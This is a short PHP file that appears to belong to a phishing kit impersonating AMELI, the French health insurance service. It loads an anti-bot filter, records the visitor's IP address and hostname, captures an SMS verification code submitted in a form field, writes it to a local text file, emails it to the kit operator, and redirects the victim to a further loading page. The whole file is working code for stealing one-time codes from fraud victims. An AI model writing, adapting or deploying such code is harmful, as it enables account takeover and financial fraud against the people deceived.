<?php
include 'antibots.php';
include 'email.php';
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[AMELI]\n";
$message .= "SMS2      : ".$_POST['o9']."\n";
$message .= "[DON]\n";
$file = fopen("../../sms2.txt","a");
fwrite($file, "\n".$message);
fclose($file);

$subject = "DON[SMS2] $ip";
$headers = "From: <localhost>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./loding3.html");
// -->
</script>';

?>